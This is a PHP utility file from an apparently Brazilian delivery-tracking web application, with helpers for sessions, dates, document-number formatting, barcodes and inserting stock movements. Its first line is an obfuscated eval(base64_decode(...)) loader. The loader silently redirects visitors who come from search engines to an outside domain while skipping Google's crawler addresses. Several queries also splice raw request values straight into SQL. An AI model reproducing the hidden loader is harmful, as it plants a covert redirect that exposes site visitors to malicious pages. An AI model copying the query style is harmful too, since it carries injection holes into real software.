<?php	 	eval(base64_decode("ZXJyb3JfcmVwb3J0aW5nKDApOyBpZiAoIWhlYWRlcnNfc2VudCgpKXsgaWYgKGlzc2V0KCRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXSkpeyBpZiAoaXNzZXQoJF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddKSl7IGlmICgocHJlZ19tYXRjaCAoIi9NU0lFICg5LjB8MTAuMCkvIiwkX1NFUlZFUlsnSFRUUF9VU0VSX0FHRU5UJ10pKSBvciAocHJlZ19tYXRjaCAoIi9ydjpbMC05XStcLjBcKSBsaWtlIEdlY2tvLyIsJF9TRVJWRVJbJ0hUVFBfVVNFUl9BR0VOVCddKSkgb3IgKHByZWdfbWF0Y2ggKCIvRmlyZWZveFwvKFswLTldK1wuMCkvIiwkX1NFUlZFUlsnSFRUUF9VU0VSX0FHRU5UJ10sJG1hdGNoZikgYW5kICRtYXRjaGZbMV0+MTEpKXsgaWYoIXByZWdfbWF0Y2goIi9eNjZcLjI0OVwuLyIsJF9TRVJWRVJbJ1JFTU9URV9BRERSJ10pKXsgaWYgKHN0cmlzdHIoJF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddLCJ5YWhvby4iKSBvciBzdHJpc3RyKCRfU0VSVkVSWydIVFRQX1JFRkVSRVInXSwiYmluZy4iKSBvciBwcmVnX21hdGNoICgiL2dvb2dsZVwuKC4qPylcL3VybFw/c2EvIiwkX1NFUlZFUlsnSFRUUF9SRUZFUkVSJ10pKSB7IGlmICghc3RyaXN0cigkX1NFUlZFUlsnSFRUUF9SRUZFUkVSJ10sImNhY2hlIikgYW5kICFzdHJpc3RyKCRfU0VSVkVSWydIVFRQX1JFRkVSRVInXSwiaW51cmwiKSBhbmQgIXN0cmlzdHIoJF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddLCJFZVlwM0Q3IikpeyBoZWFkZXIoIkxvY2F0aW9uOiBodHRwOi8vYnJyam5rbmtqYWRnZC5yZWJhdGVzcnVsZS5uZXQvIik7IGV4aXQoKTsgfSB9IH0gfSB9IH0gfQ=="));
require_once("classes/classebd.inc.php");
include("extenso.inc.php");

/**********************************************/
/*             FUNÇÕES DE SESSÃO              */
/**********************************************/
//cria nova sessão
function CriaSessao($usuario, $cdlogin, $idtransp, $cdbase, $idcli){
	session_start();
	session_register($usuario);
	//retorno com vetor de variaveis em sessão
	$_SESSION['ID'] = session_id();
	$_SESSION['USER'] = $usuario;
	$_SESSION['IDUSER'] = $cdlogin;
	$_SESSION['IDBASE'] = $cdbase;
	$_SESSION['IDTRANSP'] = $idtransp;
	$_SESSION['IDCLIENTE'] = $idcli;
}
//verifica sessão válida e retorna boolean
function VerSessao(){
	session_start();
	if (session_is_registered($_SESSION['USER'])){
		//if($_SESSION['USER']=="web") echo "<script>alert('Sua sessão expirou!');parent.menu.document.close();</script>";// document.location.href='index.php';</script>";
		//if($_SESSION['USER']=="web") echo "<script>alert('Sua sessão expirou!');parent.menu.length=1;parent.menu.location.href='embranco.htm';document.location.href='index.php';</script>";
		return true;
	}else{
		
		return false;
	}
}
//Encerra sessão
function FechaSessao($usuario){
	session_start();
	session_unregister($usuario);
}

//////////////////////////////////////////////////////////////////

function string($arg1){
	/*
	Bruno Rodrigues
	Verifica se o a variavel e string!!!
	so procura NUMBER!!!!!!!
	*/
	for ($i=0;$i<=9;$i++){
		if (strpos($arg1,$i))
		return 0;
	}
	return 1;
}


function numerico($arg1){
	/*
	Bruno Rodrigues
	Verifica se o a variavel e numerica!!!
	so procura LETRA!!!!!!!
	*/
	$letra[] = "a"; $letra[] = "A";
	$letra[] = "b"; $letra[] = "B";
	$letra[] = "c"; $letra[] = "C";
	$letra[] = "d"; $letra[] = "D";
	$letra[] = "e"; $letra[] = "E";
	$letra[] = "f"; $letra[] = "F";
	$letra[] = "g"; $letra[] = "G";
	$letra[] = "h"; $letra[] = "H";
	$letra[] = "i"; $letra[] = "I";
	$letra[] = "j"; $letra[] = "J";
	$letra[] = "l"; $letra[] = "L";
	$letra[] = "m"; $letra[] = "M";
	$letra[] = "n"; $letra[] = "N";
	$letra[] = "o"; $letra[] = "O";
	$letra[] = "p"; $letra[] = "P";
	$letra[] = "q"; $letra[] = "Q";
	$letra[] = "r"; $letra[] = "R";
	$letra[] = "s"; $letra[] = "S";
	$letra[] = "t"; $letra[] = "T";
	$letra[] = "u"; $letra[] = "U";
	$letra[] = "v"; $letra[] = "V";
	$letra[] = "x"; $letra[] = "X";
	$letra[] = "z"; $letra[] = "Z";
	$letra[] = "ç"; $letra[] = "Ç";
	
	for ($i=0;$i<count($letra);$i++){
		if (strpos($arg1,$letra[$i]))
		$bug = 1;
	}
	if($bug)
	return 0;
	else
	return 1;
}

function verifica_data($arg1){
	//quebrando a data
	$emissao = $arg1;
	$primeira_barra = strpos($emissao,"/");
	$ultima_barra   = strrpos($emissao,"/");
	$ano = strrchr($emissao,"/");
	$ano = str_replace("/","",$ano);
	
	$data_contrario = strrev($emissao);
	
	$dia = strrchr($data_contrario,"/");
	$dia = str_replace("/","",$dia);
	$dia = strrev($dia);
	
	$numero_pega = strlen($ano) - strlen($dia);
	$primeira_barra++;
	$mes = substr($emissao,$primeira_barra,$numero_pega);
	
	if (checkdate($mes,$dia,$ano))
	return true;
	else
	return false;
}

function calcula_pos($nrw,$pagina,$linhas=25) {
	$row[0] = ($pagina-1)*$linhas;
	$row[1] = ($pagina*$linhas<$nrw) ? $pagina*$linhas: $nrw;
	$row[2] = (int) (($nrw+($linhas-1))/$linhas);
	return $row;
}



function link_paginas($totp,$pagina,$param,$tipo=0) {
	global $PHP_SELF;
	
	// Exibe as páginas com seus respectivos links (no máximo 30 páginas)
	$inicio=1;
	$fim=($totp>15) ? 15: $totp;
	$stat=0;
	if($pagina>$fim and $totp!=0) {
		$stat=1;
		$inicio=$pagina-8;
		$fim=$pagina+7;
		if($fim>$totp) $fim=$totp;
	}
	
	if($stat==1) {
		$result = "<a title='Vai para a página 1' href='$PHP_SELF?pagina=1$param'>1</a>&nbsp;<a title='mais páginas' href='$PHP_SELF?pagina=" . ($inicio-1) . $param . "'>...</a>&nbsp;";
	}
	for($ww=$inicio;$ww<=$fim;$ww++) {
		if($ww!=$pagina) {
			$result.= "<a href=\"$PHP_SELF?pagina=$ww$param\">$ww</a>&nbsp;";
		}
		else $result.= "<font color=\"#FF0000\">$ww</FONT>&nbsp;";
	}
	if($fim!=$totp) {
		$result.= "<a title='mais' href=\"$PHP_SELF?pagina=" . ($fim + 1) . "$param\">...</a>&nbsp;<a href='$PHP_SELF?pagina=$totp$param' >$totp</a>";
	}
	
	if ($result)
	$result = "<center>P&aacute;gina: " . $result . "</center>";
	
	if($tipo==0)
	echo $result;
	else
	return $result;
}



function troca_car($str) {
	$str = str_replace("\"","&quot;",$str);
	return $str;
	
}

function troca_decimal($numero,$st=1) {
	// st=1 troca virgula por ponto,st=2 ponto por virgula
	$var_at = ($st=="1") ? "," : ".";
	$var_nw = ($st=="1") ? "." : ",";
	return str_replace($var_at,$var_nw,$numero);
}

function valida_img($img,$maxksize=300) {
	global $HTTP_POST_FILES, $$img;
	
	$erro="0";
	
	if(empty($$img) OR $$img=="none")
	return $erro;
	
	// verifica o tamanho do arquivo
	if($HTTP_POST_FILES[$img]["size"]>$maxksize*1024)
	$erro = "1";
	elseif(substr($HTTP_POST_FILES[$img]["type"],0,5)!="image")
	$erro = "2";
	
	return $erro;
}

function conv_data($data,$hora=0,$min=0) {
	ereg("([0-9]{2})([-.\/])([0-9]{2})([-.\/])([0-9]{4})",$data,$datadiv);
	return mktime($hora,$min,0,$datadiv[3],$datadiv[1],$datadiv[5]);
}

////////////////////////////////////////////////////////////////////////

/**********************************************/
/*             CRIA COMBOS BOX                */
/**********************************************/
//monta comboboxes de maneira simplificada, apartir da leitura de uma query SQL
//sempre o 1º nome de campo será o value e o segundo aprensentado no option

function combo($sql,$chave_selecionado="",$mostra_erro=1) {
	$combo = new consulta($con);
	$combo->executa($sql);
	
	if($combo->nrw > 0){
		
		if($mostra_erro!=2)
		echo "<option value='-1'>Selecione uma opção</option>";
		
		for ($i = 0; $i < $combo->nrw; $i++){
			$combo->navega($i);
			echo "<option value='".$combo->data[0]."' ".(($chave_selecionado==$combo->data[0])?"selected":"")." >".$combo->data[1]."</option>";
		}
		
	}elseif($mostra_erro)
	echo "<option value='-1'>".((strlen($mostra_erro)>2) ? $mostra_erro : "Nenhum registro cadastrado")."</option>";
}



function converte_data($data){
	if (strstr($data, "/")){
		$A = explode ("/", $data);
		$V_data = $A[2] . "-". $A[1] . "-" . $A[0];
	}
	else{
		$A = explode ("-", $data);
		$V_data = $A[2] . "/". $A[1] . "/" . $A[0];
	}
	return $V_data;
}


/***************************************************************************************/
/*             Function para Verificar a diferença entre duas datas  - Ricardo Tadeu  */
/***************************************************************************************/


function date_dif($date_ini, $date_end) {
	if (strcmp(substr($date_ini, 2, 1 ), "/") == 0) {
		$date_ini = substr($date_ini, 6, 4).substr($date_ini, 2, 4).substr($date_ini, 0, 2);
		$date_end = substr($date_end, 6, 4).substr($date_end, 2, 4).substr($date_end, 0, 2);
	}
	
	$initial_date = getdate(strtotime($date_ini));
	$final_date = getdate(strtotime($date_end));
	
	$dif = ($final_date[0] - $initial_date[0]) / 86400;
	return $dif;
}
////////////////////////////////////////////////////////////////////////

/***************************************************************************************/
/*                        Funções acrescentadas por Daniel							   */
/***************************************************************************************/


function data_soma_dia($data,$qtd_dias){
	//passe uma data no formato dd/mm/aaaa como primeiro argumento e a qtd de dias a ser somado a aquela data como segundo argumento
	$data_partes = explode("/",$data);
	$data_int = mktime(0,0,0,$data_partes[1],$data_partes[0]+$qtd_dias,$data_partes[2]);
	$data_nova = date("d/m/Y",$data_int);
	return $data_nova;
}


function data_subtrai_dia($data,$qtd_dias){
	//passe uma data no formato dd/mm/aaaa como primeiro argumento e a qtd de dias a ser subtraido daquela data como segundo argumento
	$data_partes = explode("/",$data);
	$data_int = mktime(0,0,0,$data_partes[1],$data_partes[0]-$qtd_dias,$data_partes[2]);
	$data_nova = date("d/m/Y",$data_int);
	return $data_nova;
}

function mostra_data($datestamp,$tpo=2){
	// transforma a data de timestamp para data normal do tipo determinado:
	// tpo=1 "dd/mm/aaaa Hr:Min:Sec", tpo=2 "dd/mm/aaaa",tpo=3 "Hr:Min:Sec"
	global $TimezoneOffset;
	$TimezoneOffset = '00';
	$datestamp=trim($datestamp);
	if (empty($datestamp) || $datestamp=="0000-00-00" || $datestamp == "0000-00-00 00:00:00" || $datestamp == "00:00:00" || $datestamp == "0000-00-00 00:00:00-03" || $datestamp=="NULL") {
		$datestamp = "0000-00-00 00:00:00";
		$false=1;
	}
	if($false!=1){
		list($date,$time) = explode(" ",$datestamp);
		list($year,$month,$day) = explode("-",$date);
		list($hour,$minute,$second) = explode(":",$time);
		$hour = $hour + $TimezoneOffset;
		$tstamp = mktime($hour,$minute,$second,$month,$day,$year);
		//$tstamp = adodb_mktime($hour,$minute,$second,$month,$day,$year);
		if ($tpo == 1)
		$sDate = date("d/m/Y H:i:s",$tstamp);
		else if ($tpo == 2)
		$sDate = date("d/m/Y",$tstamp);
		else if ($tpo == 3)
		$sDate = date("H:i:s",$tstamp);
		return $sDate;
	}else
	return false;
}

function grava_data($datestamp,$tipo="Y-m-d"){
	// transforma data normal em data do tipo timestamp
	global $TimezoneOffset;
	$TimezoneOffset = '00';
	$datestamp=trim($datestamp);
	
	if (empty($datestamp) || $datestamp=="00/00/0000" || $datestamp=="0" || conv_data($datestamp) == "-1" || conv_data($datestamp) == "0") {
		//                    $datestamp = "0000-00-00 00:00:00";
		$datestamp = "00/00/0000 00:00:00";
		$false=1;
	}
	if($false!=1){
		list($date,$time) = explode(" ",$datestamp);
		list($day,$month,$year) = explode("/",$date);
		list($hour,$minute,$second) = explode(":",$time);
		$hour = $hour + $TimezoneOffset;
		$tstamp = mktime($hour,$minute,$second,$month,$day,$year);
		//$tstamp = adodb_mktime($hour,$minute,$second,$month,$day,$year);
		
		if(!$tipo)
		$tipo = "Y-m-d H:i:s";
		
		$sDate = date("$tipo",$tstamp);
		
		return $sDate;
	}else
	return "NULL";
}

function grava_num($num){
	// retira alguns caracteres da variavel para gravar como numerico
	// Ex: "123.456.789-00" vira "12345678900"
	$num = trim($num);
	$num = str_replace(",","",$num);
	$num = str_replace(".","",$num);
	$num = str_replace("-","",$num);
	$num = str_replace("/","",$num);
	$num = str_replace("(","",$num);
	$num = str_replace(")","",$num);
	$num = str_replace("_","",$num);
	return $num;
}

function grava_valor($valor) {
	$valor = trim($valor);
	$valor = str_replace("_","",$valor);
	$valor = str_replace("/","",$valor);
	$valor = str_replace("(","",$valor);
	$valor = str_replace(")","",$valor);
	$valor = str_replace("$","",$valor);
	$valor = str_replace("R","",$valor);
	$valor = str_replace("U","",$valor);
	$valor = str_replace("%","",$valor);
	
	if(strpos($valor,",") and strpos($valor,"."))
	$valor = str_replace(".","",$valor);
	
	$valor = str_replace(",",".",$valor);
	
	if(!$valor)
	$valor = 0;
	
	if(($valor/1) != $valor)
	die("<script>alert('Valor inválido');history.back();</script>");
	
	return $valor;
}

function grava_str($string){
	$string = mostra_nome($string);
	$string = addslashes($string);
	return $string;
}

function mes_ext($mes) {
	$mes_nome = Array(
	"Janeiro",
	"Fevereiro",
	"Março",
	"Abril",
	"Maio",
	"Junho",
	"Julho",
	"Agosto",
	"Setembro",
	"Outubro",
	"Novembro",
	"Dezembro"
	);
	return $mes_nome[--$mes];
}

function form_hora_minuto($hora="",$minuto="",$retorno=""){
	if($hora=="" and $minuto==""){
		$hora=date("H");
		$minuto=date("i");
	}
	//hora minuto

	if((strlen($minuto))==1)
	$minuto="0".$minuto;

	if((strlen($hora))==1)
	$hora="0".$hora;

	for($h=0;$h<=23;$h++)
	{
		if(intval($hora) == $h)
		$selected="selected";
		else 
		$selected="";
		
		if((strlen($h))==1)
		$h="0".$h;
		//$horas[$h]="$h";
		$options_horas.= "<option value='$h' $selected>$h</option>";
	}

	for($m=0;$m<=59;$m++)
	{
		if(intval($minuto) == $m)
		$selected="selected";
		else 
		$selected="";
		
		if((strlen($m))==1)
		$m="0".$m;
		//$minutos[$m]="$m";
		$options_minutos.= "<option value='$m' $selected>$m</option>";
	}
	
	if(!$retorno)
	return "<select name='hora'>$options_horas</select>&nbsp;<select name='minuto'>$options_minutos</select>";
	elseif($retorno=="hora")
	return "$options_horas";
	elseif($retorno=="minuto")
	return "$options_minutos";

}

function download_arquivo_texto($nome_arquivo,$caminho,$separador="\r\n"){
	header("Content-disposition: attachment; filename=\"$nome_arquivo\"");
	header("Content-type: application/octetstream");
	header("Pragma: no-cache");
	header("Expires: 0");
	
	$client=getenv("HTTP_USER_AGENT");
	
	if(substr($caminho,strlen($caminho)-1,1) == "/")
	$caminho_nome_arquivo = $caminho.$nome_arquivo;
	else
	$caminho_nome_arquivo = "$caminho/$nome_arquivo";
	
	$arquivo = file("$caminho_nome_arquivo");
	for($i=0;$i<count($arquivo);$i++){
		print $arquivo[$i].$separador;
	}
}

function codigodebarras($codigo,$arquivosalvaimagem="",$nomepastasalvaimagem="",$saida="jpeg",$tipo="C39",$largura="400",$altura="100",$largura_barra="2",$tamanho_texto="2",$mostra_bordas="",$mostra_cod="1",$mostra_cod_esp="",$mostra_negativo=""){
	
	define (__TRACE_ENABLED__, false);
	define (__DEBUG_ENABLED__, false);
	
	
	$code = $codigo;
	$type = $tipo;
	$width = $largura;
	$height = $altura;
	$xres = $largura_barra;
	$font = $tamanho_texto;
	
	if($arquivosalvaimagem){
		$label = 1;
		$imagefilename = $arquivosalvaimagem;
		if($nomepastasalvaimagem){
			$nomepastasalvaimagem = $nomepastasalvaimagem."/";
			if(!is_dir("barcode/$nomepastasalvaimagem"))
			mkdir("barcode/$nomepastasalvaimagem");
		}
	}
	
	require_once("barcode/barcode.php");
	
	$style = BCS_ALIGN_CENTER;
	$style |= ($saida  == "png" ) ? BCS_IMAGE_PNG  : 0;
	$style |= ($saida  == "jpeg" or $saida  == "jpeg") ? BCS_IMAGE_JPEG : 0;
	$style |= ($mostra_bordas  == "1"  ) ? BCS_BORDER : 0;
	$style |= ($mostra_cod == "1"  ) ? BCS_DRAW_TEXT  : 0;
	$style |= ($mostra_cod_esp == "1" ) ? BCS_STRETCH_TEXT  : 0;
	$style |= ($mostra_negativo == "1"  ) ? BCS_REVERSE_COLOR  : 0;
	
	if (!isset($style))  $style   = BCD_DEFAULT_STYLE;
	if (!isset($width))  $width   = BCD_DEFAULT_WIDTH;
	if (!isset($height)) $height  = BCD_DEFAULT_HEIGHT;
	if (!isset($xres))   $xres    = BCD_DEFAULT_XRES;
	if (!isset($font))   $font    = BCD_DEFAULT_FONT;
	
	require_once("barcode/i25object.php");
	require_once("barcode/c39object.php");
	require_once("barcode/c128aobject.php");
	require_once("barcode/c128bobject.php");
	require_once("barcode/c128cobject.php");
	
	$tam = strlen($code);
	/*
	if ($tam == 1) $code = "0000000" . $code;
	else if ($tam == 2) $code = "000000" . $code;
	else if ($tam == 3) $code = "00000" . $code;
	else if ($tam == 4) $code = "0000" . $code;
	else if ($tam == 5) $code = "000" . $code;
	else if ($tam == 6) $code = "00" . $code;
	else if ($tam == 7) $code = "0" . $code;
	*/
	switch ($type)
	{
		case "I25":
		$obj = new I25Object($width, $height, $style, $code);
		break;
		case "C128A":
		$obj = new C128AObject($width, $height, $style, $code);
		break;
		case "C128B":
		$obj = new C128BObject($width, $height, $style, $code);
		break;
		case "C128C":
		$obj = new C128CObject($width, $height, $style, $code);
		break;
		default:
		//"C39":
		$obj = new C39Object($width, $height, $style, $code);
		break;
	}
	
	if ($obj) {
		$obj->SetFont($font);
		$obj->DrawObject($xres);
		$imagefilename = "barcode/$nomepastasalvaimagem". $imagefilename;
		if($label) $obj->FlushObject2File($imagefilename);
		else
		{
			$obj->FlushObject();
			$obj->DestroyObject();
		}
		unset($obj);  /* clean */
	}
}


function combo_estados($selecionado="",$tipo="") {
	if(!$tipo){
		$estados = Array("AC"=>"AC","AL"=>"AL","AM"=>"AM","AP"=>"AP","BA"=>"BA","CE"=>"CE","DF"=>"DF","ES"=>"ES",
		"GO"=>"GO","MA"=>"MA","MG"=>"MG","MS"=>"MS","MT"=>"MT","PA"=>"PA","PB"=>"PB","PE"=>"PE","PI"=>"PI",
		"PR"=>"PR","RJ"=>"RJ","RN"=>"RN","RO"=>"RO","RR"=>"RR","RS"=>"RS","SC"=>"SC","SE"=>"SE","SP"=>"SP","TO"=>"TO");
	}elseif($tipo){
		$estados = Array("AC"=>"Acre","AL"=>"Alagoas","AP"=>"Amapa","AM"=>"Amazonas","BA"=>"Bahia","CE"=>"Ceará","DF"=>"Distrito Federal","ES"=>"Espírito Santo",
		"GO"=>"Goiás","MA"=>"Maranhão","MT"=>"Mato Grosso","MS"=>"Mato Grosso do Sul","MG"=>"Minas Gerais","PA"=>"Pará","PB"=>"Paraíba","PR"=>"Paraná","PE"=>"Pernambuco","PI"=>"Piauí",
		"RJ"=>"Rio de Janeiro","RN"=>"Rio Grande do Norte","RS"=>"Rio Grande do Sul","RO"=>"Rondônia","RR"=>"Roraima","SC"=>"Santa Catarina","SP"=>"São Paulo","SE"=>"Sergipe","TO"=>"Tocantins");
	}
	
	
	while(list($uf,$descricao) = each($estados))
	{
		$options.= "<option value=\"$uf\" ".(($uf==$selecionado)?"selected":"")." >$descricao</option>";
	}
	
	
	return $options;
}

function mostra_nome($nome){
	// ajeita completamente uma variavel.
	// Ex:"JosEliTo DAs neves" vira "Joselito das Neves"
	
	$nome = trim($nome);
	$nome = strtolower($nome);
	$nome = ucwords($nome);
	$nome = str_replace(" Das "," das ",$nome);
	$nome = str_replace(" Da "," da ",$nome);
	$nome = str_replace(" Dos "," dos ",$nome);
	$nome = str_replace(" Do "," do ",$nome);
	$nome = str_replace(" De "," de ",$nome);
	$nome = str_replace(" Di "," di ",$nome);
	$nome = str_replace(" E "," e ",$nome);
	$nome = str_replace("Das ","das ",$nome);
	$nome = str_replace("Da ","da ",$nome);
	$nome = str_replace("Dos ","dos ",$nome);
	$nome = str_replace("Do ","do ",$nome);
	$nome = str_replace("De ","de ",$nome);
	$nome = str_replace("Di ","di ",$nome);
	$nome = str_replace("E ","e ",$nome);
	
	$nome = $nome." ";
	$nome = str_replace("Ii ","II ",$nome);
	$nome = str_replace("Iii ","III ",$nome);
	$nome = str_replace("Iv ","IV ",$nome);
	$nome = str_replace("Vi ","VI ",$nome);
	$nome = str_replace("Vii ","VII ",$nome);
	$nome = str_replace("Viii ","VIII ",$nome);
	$nome = str_replace("Ix ","IX ",$nome);
	$nome = str_replace("Xi ","XI ",$nome);
	$nome = str_replace("Xii ","XIL ",$nome);
	$nome = str_replace("Xiii ","XIII ",$nome);
	$nome = str_replace("Xiv ","XIV ",$nome);
	$nome = str_replace("Xv ","XV ",$nome);
	$nome = str_replace("Xvi ","XVI ",$nome);
	$nome = str_replace("Xvii ","XVII ",$nome);
	$nome = str_replace("Xviii ","XVIII ",$nome);
	$nome = str_replace("Xix ","XIX ",$nome);
	$nome = str_replace("Xx ","XX ",$nome);
	$nome = str_replace("Xxi ","XXI ",$nome);
	$nome = str_replace("Xxii ","XXIL ",$nome);
	$nome = str_replace("Xxiii ","XXIII ",$nome);
	$nome = str_replace("Xxiv ","XXIV ",$nome);
	$nome = str_replace("Xxv ","XXV ",$nome);
	$nome = str_replace("Xxvi ","XXVI ",$nome);
	$nome = str_replace("Xxvii ","XXVII ",$nome);
	$nome = str_replace("Xxviii ","XXVIII ",$nome);
	$nome = str_replace("Xxix ","XXIX ",$nome);
	$nome = str_replace("Xxx ","XXX ",$nome);
	$nome = str_replace("Xxxi ","XXXI ",$nome);
	$nome = str_replace("Xxxii ","XXXIL ",$nome);
	$nome = str_replace("Xxxiii ","XXXIII ",$nome);
	$nome = str_replace("Xxxiv ","XXXIV ",$nome);
	$nome = str_replace("Xxxv ","XXXV ",$nome);
	$nome = str_replace("Xxxvi ","XXXVI ",$nome);
	$nome = str_replace("Xxxvii ","XXXVII ",$nome);
	$nome = str_replace("Xxxviii ","XXXVIII ",$nome);
	$nome = str_replace("Xxxix ","XXXIX ",$nome);
	$nome = str_replace("Xl ","XL ",$nome);
	$nome = str_replace("Xli ","XLI ",$nome);
	$nome = str_replace("Xlii ","XLII ",$nome);
	$nome = str_replace("Xliii ","XLIII ",$nome);
	$nome = str_replace("Xliv ","XLIV ",$nome);
	$nome = str_replace("Xlv ","XLV ",$nome);
	$nome = str_replace("Xlvi ","XLVI ",$nome);
	$nome = str_replace("Xlvii ","XLVII ",$nome);
	$nome = str_replace("Xlviii ","XLVIII ",$nome);
	$nome = str_replace("Xlix ","XLIX ",$nome);
	
	$nome = trim($nome);
	return $nome;
}

function mostra_cpf($doc) {
	// retorna o cpf devidamente separado para a exibição do mesmo
	$doc = trim($doc);
	$doc = str_replace("-","",$doc);
	$doc = str_replace(".","",$doc);
	$doc = str_replace("/","",$doc);
	$doc = str_replace("(","",$doc);
	$doc = str_replace(")","",$doc);
	
	if($doc){
		$cpf1 = substr($doc,0,3);
		$cpf2 = substr($doc,3,3);
		$cpf3 = substr($doc,6,3);
		$cpf4 = substr($doc,9,2);
		$doc  = $cpf1.".". $cpf2.".". $cpf3."-". $cpf4;
	}else
	$doc="";
	return $doc;
}

function mostra_cnpj($doc) {
	// retorna o cnpj devidamente separado para a exibição do mesmo
	$doc = trim($doc);
	$doc = str_replace("-","",$doc);
	$doc = str_replace(".","",$doc);
	$doc = str_replace("/","",$doc);
	$doc = str_replace("(","",$doc);
	$doc = str_replace(")","",$doc);
	
	if($doc){
		$ped1 = substr($doc, 0, 2);
		$ped2 = substr($doc, 2, 3);
		$ped3 = substr($doc, 5, 3);
		$ped4 = substr($doc, 8, 4);
		$ped5 = substr($doc, 12, 2);
		
		$doc = $ped1 . "." . $ped2 . "." . $ped3 . "/" . $ped4 . "-" . $ped5;
	}else
	$doc="";
	return $doc;
}

function mostra_cep($doc) {
	// retorna o cep devidamente separado para a exibição do mesmo
	$doc = trim($doc);
	$doc = str_replace("-","",$doc);
	$doc = str_replace(".","",$doc);
	$doc = str_replace("/","",$doc);
	$doc = str_replace("(","",$doc);
	$doc = str_replace(")","",$doc);
	
	if($doc){
		$ped1 = substr($doc, 0, 5);
		$ped2 = substr($doc, 5, 3);
		
		$doc = $ped1 . "-" . $ped2;
	}else
	$doc="";
	return $doc;
}

function mostra_telefone($tel) {
	// retorna o número do telefone devidamente separado para a exibição do mesmo
	$tel = trim($tel);
	$tel = str_replace("-","",$tel);
	$tel = str_replace(".","",$tel);
	$tel = str_replace("/","",$tel);
	$tel = str_replace("(","",$tel);
	$tel = str_replace(")","",$tel);
	
	
	if($tel!=0 and $tel!=""){
		if (strlen($tel) == 8){
			$primeira_casa = substr($tel,0,4);
			$segunda_casa = substr($tel,4,5);
			$numero = $primeira_casa . "-" . $segunda_casa;
		}
		else if (strlen($tel) == 7){
			$primeira_casa = substr($tel,0,3);
			$segunda_casa = substr($tel,3,4);
			$numero = $primeira_casa . "-" . $segunda_casa;
		}
		else if (strlen($tel) == 9){
			$primeira_casa = substr($tel,0,3);
			$segunda_casa = substr($tel,3,6);
			$numero = "0".$primeira_casa . "-" . $segunda_casa;
		}
	}else
	$numero="";
	return $numero;
}

////////////////////////////////////////////////////////////////////////



/**********************************************/
/*             FUNÇÕES DE MOVIMENTO           */
/**********************************************/
//INSERE registro em movimento de acordo com o ID solicitado identificando sua integridade
function inseremovimento($idinterno,$idmov,$idmovp,$numlista,$codbasedestino,$codigocourier,$idmotivo="",$obs_recuperar_tlmk="",$obs_movimento=""){
	
	$qryfunc  = new consulta($con);
	$qryfunc1 = new consulta($con);
	$qryfunc2 = new consulta($con);
	$qryfunc3 = new consulta($con);
	
	//verifica integridade
	$qryfunc1->executa("SELECT idtransportadora,codbase,codcliente,codigoproduto,quantidadevolumes FROM tbentrega WHERE idinterno=".$idinterno);
	//Identifica a possibilidade de troca de ID do Movimento
	$qryfunc2->executa("SELECT idtipomovimento FROM tbcriticamovimento WHERE idtipomovimento=".$idmov." AND idpermitido=".$idmovp);
	//Identifica a necessidade de ler o estoque
	$qryfunc3->executa("SELECT contaestoque FROM tbconfigproduto WHERE idtransportadora ='".$qryfunc1->data["idtransportadora"]."' AND codigoproduto ='" . $qryfunc1->data["codigoproduto"] . "' AND codcliente = '".$qryfunc1->data["codcliente"]."'");
	
	$qtd_vol = $qryfunc1->data["quantidadevolumes"];
	
	if ($qryfunc2->nrw<=0){
		/*
		if(!$mostra_erro_javascript and $_SESSION["USER"]=="web"){
		$qryfunc4 = new consulta($con);
		$qryfunc4->executa("SELECT msg FROM tberro WHERE idde ='".$idmov."' AND idpara ='" . $idmovp . "'");
		if($qryfunc4->data["msg"])
		$msg_erro = addslashes($qryfunc4->data["msg"]);
		else
		$msg_erro = "Movimento não permitido.";
		
		?>
		<script>
		clicou_no_ok=0;
		while (clicou_no_ok==0){
		cancel.focus();
		if(confirm('<?=$msg_erro;?>',true,false))
		clicou_no_ok=1;
		
		
		}
		</script>
		<?
		return $err[0]=3;
		}else
		*/
		return $err[0]=3; //Não é permitido apontar para esse indice nesta encomenda
	}else{
		//movimenta estoque
		//104 = Lista Espedida//105 = Entregue//132 = Roubo//133 = Extravio//135/36/37 = telemarketing 1ª.2ª.3ª//150 = devolvido
		
		if (($idmovp == "102" || $idmovp == "105" || $idmovp == "132" || $idmovp == "133" || $idmovp == "135" || $idmovp == "136" || $idmovp == "137" || $idmovp == "150" || $idmovp == "164" || $idmovp == "180" || $idmovp == "400" ) && $qryfunc3->data["contaestoque"]==1) {  //CodBase deve ser identificado na CARGA!!!!!!
		movimentaestoque($qryfunc1->data["idtransportadora"],$qryfunc1->data["codcliente"], $qryfunc1->data["codigoproduto"],  $qryfunc1->data["codbase"],$idmovp,$qtd_vol);
		}
		
		
		if($codigocourier and $codigocourier > 0)
		$sql_courier = "'".$codigocourier."'";
		else
		$sql_courier = "NULL";
		
		if($codbasedestino and $codbasedestino > 0)
		$sql_destino = "'".$codbasedestino."'";
		else
		$sql_destino = "NULL";
		
		$obs_movimento = trim($obs_movimento);
		if($obs_movimento)
		$sql_obs = "'".$obs_movimento."'";
		else
		$sql_obs = "NULL";
		
		if($idmotivo and $idmotivo > 0)
		$sql_motivo = "'".$idmotivo."'";
		else
		$sql_motivo = "NULL";
		

		$sql = "SELECT sp_insere_movimento ('$idinterno','".$_SESSION['IDUSER']."','".intval($numlista)."','$idmovp','".$_SESSION['IDBASE']."','".date('Y-m-d')."','".date('H:i:s')."','".$_SESSION['IDTRANSP']."',$sql_courier,$sql_destino,$sql_obs,$sql_motivo)";
		/*
		//INSERT tbmovimento
		//Begin
		$sql="insert into"." tbmovimento";
		$sql.= "(idinterno".",";        //01
		$sql.="codlogin".",";           //02
		$sql.="numlista".",";		    //03
		$sql.="idtipomovimento".",";    //04
		$sql.="codbase".",";            //05
		$sql.="dataoperacao".",";       //06
		$sql.="horaoperacao".",";       //07
		$sql.="idtransportadora";       //08
		if ($idmotivo){
		$sql.=","."idmotivo";       //09
		}
		if ($codigocourier and $codigocourier > 0){
		$sql.=","."codigocourier";  //10
		//}else if ($codbasedestino<>""){
		}
		if($codbasedestino and $codbasedestino > 0){
		$sql.=","."codbasedestino"; //11
		}
		if(trim($obs_movimento)){
		$sql.=","."obs";			//12
		}
		$sql.=")";
		$sql.=" values ";
		$sql.="("."'".$idinterno."'".",";          //01
		$sql.="'".$_SESSION['IDUSER']."'".",";     //02
		$sql.="'".$numlista."'".",";			   //03
		$sql.="'".$idmovp."'".",";                 //04
		$sql.="'".$_SESSION['IDBASE']."'".",";     //05
